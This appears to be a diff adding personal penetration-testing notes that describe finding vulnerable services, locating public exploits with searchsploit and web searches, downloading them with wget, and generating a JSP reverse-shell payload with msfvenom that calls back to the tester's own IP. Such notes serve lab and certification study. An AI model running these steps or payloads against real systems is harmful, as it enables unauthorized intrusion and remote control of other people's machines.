@@ -1,1 +1,17 @@
+After running the vulners script OR autorecon, we should find some vulnerable ports running vulnerable services. If it is a website port refer to the web foothold.
 
+1. We can use searchsploit AND a google search for potential exploit packages.
+
+-- searchsploit arcticmage 8.0.2
+
+-- Google search 'arcticmage 8.0.2 exploit'
+
+2. Next we will either download the script from the internet OR use a script internally downloaded to kali.
+
+--
+
+-- To download the googled script we will need to 'sudo wget <githubexploit.py>
+
+3. Next, we will execute the script. Depending on the type of exploit this step might look dramatically different.
+
+-- For .jsp files we will use the following script to create the payload 'sudo msfvenom -p java/jsp_shell_reverse_tcp lhost=<my ip> port=4343 -f raw > payload.jsp
